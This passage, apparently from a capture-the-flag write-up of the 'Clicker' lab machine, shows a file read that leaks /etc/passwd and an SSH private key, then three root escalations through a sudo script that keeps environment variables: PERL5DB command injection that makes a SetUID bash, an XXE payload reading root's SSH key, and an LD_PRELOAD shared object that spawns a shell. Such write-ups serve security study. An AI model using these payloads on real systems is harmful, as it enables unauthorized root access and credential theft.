pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
' at line 1

```

I can also get jack’s SSH private key:

```
www-data@clicker:/opt/manage$ ./execute_query 223 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
...[snip]...
LsOxRu230Ti7tRBOtV153KHlE4Bu7G/d028dbQhtfMXJLu96W1l3Fr98pDxDSFnig2HMIi
lL4gSjpD/FjWk9AAAADGphY2tAY2xpY2tlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1

```

### SSH

Interestingly, if I try to use this key just as is, I get:

```
oxdf@hacky$ ssh -i ~/keys/clicker-jack jack@clicker.htb
Load key "/home/oxdf/keys/clicker-jack": error in libcrypto
jack@clicker.htb's password:

```

I’ll have to add two “-“ to the first and last line from the key (no idea why those got truncated), and then it works:

```
oxdf@hacky$ ssh -i ~/keys/clicker-jack jack@clicker.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)
...[snip]...
jack@clicker:~$

```

And I can get `user.txt`:

```
jack@clicker:~$ cat user.txt
fa528539************************

```

## Shell as root

### Enumeration

jack has two `sudo` entries configured:

```
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh

```

With a password, jack can run any command as any user. Without a password, jack can run `monitor.sh` (with `SETENV` set). `SETENV` preserves the environment when calling the script.

### monitor.sh

#### Script

The `monitor.sh` script is relatively simple:

```
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi

```

It starts by making sure it’s running as root. Then it sets the PATH and `unset` some Perl-related env variables. These are presumably for security issues, preventing a hijack of `xml_pp` which is Perl-based.

```
jack@clicker:/opt$ file /usr/bin/xml_pp
/usr/bin/xml_pp: Perl script text executable

```

Then it uses `curl` to request the `diagnostic.php` page from the site, passing the token “secret\_diagnostic\_token”, and sends the result into `xml_pp`, and saves the result to a file in `/root`.

`xml_pp` (short for [XML pretty printer](https://metacpan.org/dist/XML-Twig/view/tools/xml_pp/xml_pp)) will print XML data in a nicer way.

#### diagnostic.php

`diagnostic.php` starts by checking the the correct token is passed as a GET parameter:

```
<?php
if (isset($_GET["token"])) {
    if (strcmp(md5($_GET["token"]), "ac0e5a6a3a50b5639e69ae6d8cd49f40") != 0) {
        header("HTTP/1.1 401 Unauthorized");
        exit;
	}
}
else {
    header("HTTP/1.1 401 Unauthorized");
    die;
}

```

“secret\_diagnostic\_token” is the right password here:

```
jack@clicker:/opt$ echo -n 'secret_diagnostic_token' | md5sum
ac0e5a6a3a50b5639e69ae6d8cd49f40  -

```

Then it defines a function that converts an array to XML. Then it gets a bunch of stats about the server and returns it as XML:

```
$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";

$connection_test = "OK";

try {
	$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password, array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
} catch(PDOException $ex){
    $connection_test = "KO";
}
$data=[];
$data["timestamp"] = time();
$data["date"] = date("Y/m/d h:i:sa");
$data["php-version"] = phpversion();
$data["test-connection-db"] = $connection_test;
$data["memory-usage"] = memory_get_usage();
$env = getenv();
$data["environment"] = $env;

$xml_data = new SimpleXMLElement('<?xml version="1.0"?><data></data>');
array_to_xml($data,$xml_data);
$result = $xml_data->asXML();
print $result;
?>

```

#### Run

Running the script without root fails as expected, and as root returns the XML as expected:

```
jack@clicker:/opt$ /opt/monitor.sh
Error, please run as root
jack@clicker:/opt$ sudo /opt/monitor.sh
<?xml version="1.0"?>
<data>
  <timestamp>1706213156</timestamp>
  <date>2024/01/25 08:05:56pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1173</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:26785</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>fa242859cf764eb9975e7efc5d6d3c37</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>

```

### Split Path

Giving a user access to environment variables is dangerous, and while the author tires to prevent some attacks by setting the `PATH` and unsetting two Perl-related variables, there are still multiple ways to get root on this box. I’ll show three (with the intended path in yellow):

```
flowchart TD;
    I[Shell as jack]-->A(sudo monitor.sh)
    A-->B(Perl Debug);
    B-->C(Code Execution);
    C-->D[root Shell];
    A-->E(http_proxy);
    E-->F(XXE File Read);
    F-->G(root SSH Key);
    G-->D;
    A-->H(LD_PRELOAD);
    H-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3,8,9 stroke-width:2px,stroke:#4B9CD3,fill:none;

```

### Method \#1 via Perl Debug

#### Background

There’s a flag in Perl, `-d` , that sets the debugger:

> -d\[:debugger\] run program under debugger

In this script, I can’t set flags in the command line, but I can set the `PERL5OPT` environment variable, which will also set options. So if I set `PERL5OPT=-d`, then the debugger will be invoked.

There’s another variable, `PERL5DB` that sets a BEGIN block for the code to run when the debugger starts.

There is a somewhat famous example of a bug in the Exim mail server from 2016 where it allowed the user to set environment variables in this way, [CVE-2016-1531](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531):

> Exim before 4.86.2, when installed setuid root, allows local users to gain privileges via the perl\_startup argument.

[POCs](https://www.exploit-db.com/exploits/39702) for this vulnerability show these variables used in exploitation:

![image-20240125153156507](https://0xdf.gitlab.io/img/image-20240125153156507.png)

#### Exploit

To run this, I’ll just set these environment variables to touch a file:

```
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("touch /0xdf")' /opt/monitor.sh
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.

```

The `0xdf` file now exists owned by root in the system root:

```
jack@clicker:~$ ls -l /0xdf
-rw-r--r-- 1 root root 0 Jan 25 20:32 /0xdf

```

To get a shell, I’ll create a copy of `bash` and make it SetUID and SetGID:

```
jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 6777 /tmp/0xdf")' /opt/monitor.sh
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.

```

The file now exists, is owned by root, and is SetUID and SetGID:

```
jack@clicker:~$ ls -l /tmp/0xdf
-rwsrwsrwx 1 root root 1396520 Jan 25 20:36 /tmp/0xdf

```

I’ll run it (not forgetting `-p` to not drop privs) and get an effective root shell:

```
jack@clicker:~$ /tmp/0xdf -p
0xdf-5.1# id
uid=1000(jack) gid=1000(jack) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(jack)

```

And the flag:

```
0xdf-5.1# cat /root/root.txt
c9b19375************************

```

### Method \#2 via XXE

#### Configure Proxy

The intended path for this box is to use the `http_proxy` variable. This is an option for `curl` that is detailed on the `curl` [man\` page](https://curl.se/docs/manpage.html):

![image-20240127180745026](https://0xdf.gitlab.io/img/image-20240127180745026.png)

I’ll modify my Burp Proxy options to listen on all interfaces, rather than just localhost:

![image-20240125154213403](https://0xdf.gitlab.io/img/image-20240125154213403.png)

Now on running `sudo http_proxy=http://10.10.14.6:8080 /opt/monitor.sh`, the request and response show up in my Burp Proxy history:

![image-20240125154252502](https://0xdf.gitlab.io/img/image-20240125154252502.png)

This allows me to modify the request and the response.

#### XXE POC

I’ll enabling response interception in Burp, and when I run the command with `http_proxy` set to my Burp instance, it’ll hang on that intercepted request, which I’ll let go through. Then it hangs on the response:

![image-20240125154455751](https://0xdf.gitlab.io/img/image-20240125154455751.png)

I’ll grab a basic XXE payload (for example from [here](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file)) and update the response:

![image-20240125154846431](https://0xdf.gitlab.io/img/image-20240125154846431.png)

On clicking “Forward”, the file shows up in the terminal:

```
jack@clicker:~$ sudo http_proxy=http://10.10.14.6:8080 /opt/monitor.sh
<?xml version="1.0"?>
<!DOCTYPE replace [
<!ENTITY ent SYSTEM "/etc/passwd">
]>
<file>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
jack:x:1000:1000:jack:/home/jack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
_rpc:x:115:65534::/run/rpcbind:/usr/sbin/nologin
statd:x:116:65534::/var/lib/nfs:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
</file>

```

#### SSH Key

There are a handful of files I could try to read. `root.txt` would be a start, but I’d rather go for a shell. There happens to be a root SSH key when I set the XML to:

```
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "/root/.ssh/id_rsa">]>
<file>&ent;</file>

```

The result is:

```
jack@clicker:~$ sudo http_proxy=http://10.10.14.6:8080 /opt/monitor.sh
<?xml version="1.0"?>
<!DOCTYPE replace [
<!ENTITY ent SYSTEM "/root/.ssh/id_rsa">
]>
<file>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmQBWGDv1n5tAPBu2Q/DsRCIZoPhthS8T+uoYa6CL+gKtJJGok8xC
...[snip]...
UyOYOJc1Mv8zkAAAAMcm9vdEBjbGlja2VyAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
</file>

```

With that, I’m able to save it to a file on my host, and SSH in:

```
oxdf@hacky$ vim ~/keys/clicker-root
oxdf@hacky$ chmod 600 ~/keys/clicker-root
oxdf@hacky$ ssh -i ~/keys/clicker-root root@clicker.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)
...[snip]...
root@clicker:~#

```

### Method \#3 via LD\_PRELOAD

Ippsec actually pointed this one out to me (though I’m embarrassed I missed it in hindsight). If I can set almost any environment variable, why not `LD_PRELOAD`? `LD_PRELOAD` is an environment variable that tells all running programs of a library to load on executing. [This HackTricks page](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path) has exploit code.

I’ll create a simple C program that unsets the `LD_PRELOAD` variable (to prevent loops), sets the privileges to root user and group, and runs `bash`:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

```

There’s no compilation tools on the host, but since both it and my VM are Ubuntu-based, compiling locally shouldn’t cause issues. I’ll generate a `.so` file:

```
oxdf@hacky$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles

```

I’ll copy this file up to Clicker into `/tmp`. Now I can run with `LD_PRELOAD` pointing at this shared object and it will run `bash`:

```
jack@clicker:~$ sudo LD_PRELOAD=/tmp/shell.so /opt/monitor.sh
root@clicker:/home/jack#

```





